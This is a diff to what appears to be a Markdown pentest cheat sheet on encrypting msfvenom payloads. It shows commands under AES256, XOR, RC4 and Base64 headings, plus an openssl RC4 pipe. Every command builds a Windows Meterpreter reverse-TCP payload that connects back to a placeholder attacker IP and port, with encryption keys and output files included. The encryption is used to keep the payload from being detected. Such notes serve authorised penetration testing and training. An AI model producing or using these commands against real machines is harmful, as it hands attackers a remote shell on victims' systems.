@@ -16,15 +16,31 @@ Framework Encryption Formats [--encrypt <value>]
     xor
 ```
 
-- Generating and encrypting payloads using the --encrypt flags
+- Generating and encrypting payloads using the `--encrypt` flags
+
+## 01 - AES256
 
 **Note:** For AES256 encryption that the key (using flag `--encrypt-key`) must be exactly 32 bytes of length and the IV (using flag `--encrypt-iv`) must be 16 bytes of length
 
-`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt aes256 --encrypt-key 0123456789abcdefghijklmnopqrstuv --encrypt-iv 1234567890abcdef -f c -o payload_aes.c`
+```
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt aes256 --encrypt-key 0123456789abcdefghijklmnopqrstuv --encrypt-iv 1234567890abcdef -f c -o payload_aes.c
+```
 
-`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt xor --encrypt-key x0rk3y -f c -o payload_xor.c`
+## 02 - XOR
 
-`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt rc4 --encrypt-key rc4passw0rd! -f c -o payload_rc4.c`
+```
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt xor --encrypt-key x0rk3y -f c -o payload_xor.c
+```
+
+## 03 - RC4
+
+```
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt rc4 --encrypt-key "rc4passw0rd\!" -f c -o payload_rc4.c
+
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> | openssl enc -rc4 -nosalt -k "rc4passw0rd\!" > payload_rc4.bin
+```
+
+## 04 - Base64
 
 `$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt base64 -f c -o payload_base64.c`
 
